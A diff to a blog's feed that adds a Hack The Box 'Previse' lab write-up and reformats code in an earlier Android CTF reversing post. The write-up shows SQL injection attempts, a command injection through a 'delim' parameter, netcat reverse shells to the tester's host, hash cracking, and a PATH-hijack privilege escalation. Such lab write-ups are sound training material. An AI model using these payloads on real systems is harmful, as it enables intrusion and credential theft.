@@ -156,6 +156,175 @@ Alternative Finding subprocess.Popen index.
         </item>
         
         <item>
+            <title>HTB Previse - Writeup</title>
+            <link>https://harshitm98.github.io/posts/htb-machine-previse/</link>
+            <pubDate>Sat, 25 Dec 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://harshitm98.github.io/posts/htb-machine-previse/</guid>
+            <description>Enumeration Initial Enumeration Nmap Scans Initial:
+PORT STATE SERVICE REASON 22/tcp open ssh syn-ack 80/tcp open http syn-ack Service Scan:
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login.</description>
+            <content type="html"><![CDATA[<h1 id="enumeration">Enumeration</h1>
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+<h4 id="nmap-scans">Nmap Scans</h4>
+<p>Initial:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PORT      STATE    SERVICE    REASON
+22/tcp    open     ssh        syn-ack
+80/tcp    open     http       syn-ack
+</code></pre></div><p>Service Scan:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
+|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
+|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags:
+|   /:
+|     PHPSESSID:
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: Previse Login
+|_Requested resource was login.php
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><h2 id="enumeration-port-80">Enumeration: Port 80</h2>
+<h4 id="ffuf">Ffuf</h4>
+<p>common.txt</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
+config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
+css                     [Status: 200, Size: 939, Words: 61, Lines: 17]
+accounts.php            [Status: 200, Size: 2224, Words: 486, Lines: 54]
+download.php            [Status: 200, Size: 2224, Words: 486, Lines: 54]
+favicon.ico             [Status: 200, Size: 15400, Words: 15, Lines: 10]
+footer.php              [Status: 200, Size: 217, Words: 10, Lines: 6]
+files.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
+header.php              [Status: 200, Size: 980, Words: 183, Lines: 21]
+index.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
+index.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
+js                      [Status: 200, Size: 1155, Words: 77, Lines: 18]
+login.php               [Status: 200, Size: 2224, Words: 486, Lines: 54]
+logs.php                [Status: 200, Size: 2224, Words: 486, Lines: 54]
+logout.php              [Status: 200, Size: 2224, Words: 486, Lines: 54]
+nav.php                 [Status: 200, Size: 1248, Words: 462, Lines: 32]
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
+status.php              [Status: 200, Size: 2224, Words: 486, Lines: 54]
+</code></pre></div><p>medium.txt</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ffuf -u http://10.10.11.104/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -c -ic -of html -o http-medium.html
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">css                     [Status: 200, Size: 939, Words: 61, Lines: 17]
+js                      [Status: 200, Size: 1155, Words: 77, Lines: 18]
+                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
+                        [Status: 200, Size: 2224, Words: 486, Lines: 54]
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
+</code></pre></div><h4 id="sql-injections">SQL injections</h4>
+<p><code>/login.php</code></p>
+<ul>
+<li>None of the sql injections worked.</li>
+<li><code>sqlmap</code> also did not work</li>
+<li>Request:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">POST /login.php HTTP/1.1
+Host: 10.10.11.104
+Content-Length: 27
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.11.104
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-GPC: 1
+Referer: http://10.10.11.104/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: PHPSESSID=4natd10ok9pjvsrsuhr4ql0ktq
+Connection: close
+  
+username=&#39;+OR+1=1;--&amp;password=&#39;+OR+1=1;--
+</code></pre></div><pre><code>
+</code></pre></li>
+</ul>
+<h1 id="initial-foothold">Initial Foothold</h1>
+<h3 id="accountsphp">/accounts.php</h3>
+<p>Request of <code>accounts.php</code> is redirected to -&gt; <code>login.php</code></p>
+<p>But when intercepted with Burp, we have interesting results</p>
+<p><img src="/img/previse/Pasted%20image%2020211225134915.png" alt=""></p>
+<p>If we send a post request, we can create a new user
+<img src="/img/previse/Pasted%20image%2020211225134951.png" alt=""></p>
+<h4 id="sending-the-post-request">Sending the POST request</h4>
+<p>Request:</p>
+<p><img src="/img/previse/Pasted%20image%2020211225135604.png" alt=""></p>
+<p>Response:
+<img src="/img/previse/Pasted%20image%2020211225135625.png" alt=""></p>
+<p>So now we have a user with username and password as <code>fakebatman:fakebatman</code></p>
+<h2 id="getting-user-shell">Getting user shell</h2>
+<p>The logs file executes a python script and appends a delimiter that is parsed through a POST parameter</p>
+<p><em>logs.php</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">/////////////////////////////////////////////////////////////////////////////////////
+</span><span style="color:#75715e">//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
+</span><span style="color:#75715e">/////////////////////////////////////////////////////////////////////////////////////
+</span><span style="color:#75715e"></span>
+$output <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/usr/bin/python /opt/scripts/log_process.py </span><span style="color:#e6db74">{</span>$_POST[<span style="color:#e6db74">&#39;delim&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>);
+<span style="color:#66d9ef">echo</span> $output;
+</code></pre></div><p>So when we send the delim=<code>;ping 10.10.14.33 -c 5</code> and we run <code>tcpdump</code> to check if we are actually receiving any pings, we get ping hits.</p>
+<p>Appending the command:</p>
+<p><img src="/img/previse/Pasted%20image%2020211225175758.png" alt=""></p>
+<p>And we get the ping hits:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo tcpdump -i tun0 icmp
+</code></pre></div><p><img src="/img/previse/Pasted%20image%2020211225180213.png" alt=""></p>
+<h3 id="getting-a-reverse-shell-www-data">Getting a reverse shell (www-data)</h3>
+<p>Start a reverse shell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -nlvp <span style="color:#ae81ff">4444</span>
+</code></pre></div><p>Send the request</p>
+<p><img src="/img/previse/Pasted%20image%2020211225180452.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">delim=;nc+10.10.14.33+4444+-e+/bin/sh
+</span></code></pre></div><p>And we get a reverse shell</p>
+<p><img src="/img/previse/Pasted%20image%2020211225180415.png" alt=""></p>
+<h3 id="mysql-recon">MySQL recon</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ mysql -u root -p
+mysql&gt; SELECT * FROM accounts;
+SELECT * FROM accounts;
++----+---------------+------------------------------------+---------------------+
+| id | username      | password                           | created_at          |
++----+---------------+------------------------------------+---------------------+
+|  <span style="color:#ae81ff">1</span> | m4lwhere      | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
+</code></pre></div><p>Saving the hash into a file <code>m4lwhere.hash</code> and cracking the hash using hashcat</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -m <span style="color:#ae81ff">500</span> -a <span style="color:#ae81ff">0</span> m4lwhere.hash /usr/share/wordlists/rockyou.txt
+</code></pre></div><p>The cracked password</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
+</code></pre></div><h3 id="logging-in-using-these-creds">Logging in using these creds</h3>
+<p>and hoping for a password reuse</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh m4lwhere@10.10.11.104
+</code></pre></div><p>and <code>ilovecody112235!</code> as password we get a SSH shell</p>
+<p><img src="/img/previse/Pasted%20image%2020211225183445.png" alt=""></p>
+<h1 id="post-exploit-enumeration">Post Exploit Enumeration</h1>
+<h3 id="sudo--l">sudo -l</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">m4lwhere@previse:~$ sudo -l
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> m4lwhere:
+User m4lwhere may run the following commands on previse:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> /opt/scripts/access_backup.sh
+</code></pre></div><p><em>access_backup.sh</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e"># We always make sure to store logs, we take security SERIOUSLY here</span>
+
+<span style="color:#75715e"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
+<span style="color:#75715e"># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>
+
+gzip -c /var/log/apache2/access.log &gt; /var/backups/<span style="color:#66d9ef">$(</span>date --date<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;yesterday&#34;</span> +%Y%b%d<span style="color:#66d9ef">)</span>_access.gz
+gzip -c /var/www/file_access.log &gt; /var/backups/<span style="color:#66d9ef">$(</span>date --date<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;yesterday&#34;</span> +%Y%b%d<span style="color:#66d9ef">)</span>_file_access.gz
+</code></pre></div><p>Absolute paths for <code>gzip</code> and <code>date</code> is not mentioned.</p>
+<h3 id="creating-a-new-file">Creating a new file</h3>
+<p>Going to <code>/tmp</code> directory and creating a <code>date</code> file with contents</p>
+<p><em>date</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc 10.10.14.33 <span style="color:#ae81ff">9001</span> -e /bin/bash
+</code></pre></div><p><img src="/img/previse/Pasted%20image%2020211225192245.png" alt=""></p>
+<p>And then we add <code>tmp/</code> directory to the path</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ export PATH<span style="color:#f92672">=</span>tmp:/$PATH
+</code></pre></div><p>Now we run our script</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo /opt/scripts/access_backup.sh
+</code></pre></div><p>And we get a shell on our reverse tcp listener
+<img src="/img/previse/Pasted%20image%2020211225192210.png" alt=""></p>
+]]></content>
+        </item>
+        
+        <item>
             <title>HTB Cap - Writeup</title>
             <link>https://harshitm98.github.io/posts/htb-machine-cap/</link>
             <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
@@ -631,7 +800,7 @@ Note: I was not present during the event.</description>
 <p>The dynamic flag is 046e04ff67535d25dfea022033fcaaf23606b95a5c07a8c6</p>
 <h2 id="challenge-2">Challenge #2</h2>
 <p><em>Challenge2 to unlock car2: “AES key: Your Cell Mobile Is Your Key”</em></p>
-<p>Going through the this.b.k() function in MainActivity.class</p>
+<p>Going through the <code>this.b.k()</code> function in <code>MainActivity.class</code></p>
 <p><img src="https://cdn-images-1.medium.com/max/2000/1*Dzo-ZgUqs-V9ezyxpWR2xg.png" alt=""></p>
 <p>Instance of class a is called. Let’s investigate further.</p>
 <p><img src="https://cdn-images-1.medium.com/max/2000/1*hTcEQlKpyt1ClEkFJ2tChg.png" alt=""></p>
@@ -816,16 +985,16 @@ The question did say that we would have to use social engineering to get the pas
 <p><img src="https://cdn-images-1.medium.com/max/2000/1*vC6PV5N1cytGKcOEcW_lvw.png" alt="Visual representation of function where we XOR again">
 <em>Visual representation of function where we XOR again</em></p>
 <p>We recreate this above algorithm using Python:</p>
-<pre><code>p = &quot;V@]EAASB\022WZF\022e,a$7(&amp;am2(3.\003&quot;
-p = list(str(p))
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;V@]EAASB</span><span style="color:#ae81ff">\022</span><span style="color:#e6db74">WZF</span><span style="color:#ae81ff">\022</span><span style="color:#e6db74">e,a$7(&amp;am2(3.</span><span style="color:#ae81ff">\003</span><span style="color:#e6db74">&#34;</span>
+p <span style="color:#f92672">=</span> list(str(p))
 
-for i in range(len(p) // 2):
-	p[i] = chr(ord(p[i]) ^ 0x32)
-	p[len(p) // 2 + 1 + i] = chr(ord(p[len(p) // 2 + 1 + i]) ^ 0x41)
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(p) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>):
+	p[i] <span style="color:#f92672">=</span> chr(ord(p[i]) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x32</span>)
+	p[len(p) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> i] <span style="color:#f92672">=</span> chr(ord(p[len(p) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> i]) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x41</span>)
 
-p.reverse()
-print(&quot;&quot;.join(p))
-</code></pre><p>When we run this file, we get</p>
+p<span style="color:#f92672">.</span>reverse()
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(p))
+</code></pre></div><p>When we run this file, we get</p>
 <p><img src="https://cdn-images-1.medium.com/max/2000/0*e4tzOJ7YacoD7-fm" alt=""></p>
 <p>So we enter this string as the input for the EditText of the app:</p>
 <p><img src="https://cdn-images-1.medium.com/max/2000/1*OdUTNQfQSU42HpxQlN-QsA.png" alt=""></p>
@@ -838,17 +1007,17 @@ print(&quot;&quot;.join(p))
 <p><img src="https://cdn-images-1.medium.com/max/2000/0*LSNKMof9nI_hhx0W" alt="Just a readable version of function b">
 <em>Just a readable version of function b</em></p>
 <p>Here it is not possible to reverse engineer, so we try to brute force our way in. We check for what values of loop iterable i and alphabet, we get the output r.</p>
-<pre><code>import string
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> string
 
-r = &quot;\000dslp}oQ\000 dks$|M\000h +AYQg\000P*!M$gQ\000&quot;
-r = list(str(r))
-r.reverse()
+r <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\000</span><span style="color:#e6db74">dslp}oQ</span><span style="color:#ae81ff">\000</span><span style="color:#e6db74"> dks$|M</span><span style="color:#ae81ff">\000</span><span style="color:#e6db74">h +AYQg</span><span style="color:#ae81ff">\000</span><span style="color:#e6db74">P*!M$gQ</span><span style="color:#ae81ff">\000</span><span style="color:#e6db74">&#34;</span>
+r <span style="color:#f92672">=</span> list(str(r))
+r<span style="color:#f92672">.</span>reverse()
 
-for i in range(len(r)):
-	if i % 8 == 0:
-		print(&quot;_&quot;, end=&quot;&quot;)
-		continue 
-</code></pre><p>After running this file, we get the output.</p>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(r)):
+	<span style="color:#66d9ef">if</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+		<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;_&#34;</span>, end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>)
+		<span style="color:#66d9ef">continue</span> 
+</code></pre></div><p>After running this file, we get the output.</p>
 <p><img src="https://cdn-images-1.medium.com/max/2000/0*2l3YUXwHRTiocYUK" alt=""></p>
 <p>The values for every 8th position is ‘_’ because we have i%8 == 0. And irrespective of the alphabets, the output from the function is 0, so it is difficult to find the answer using brute force.</p>
 <p>So the message could be <strong>May I <em>PLEASE</em> have the password</strong>.</p>
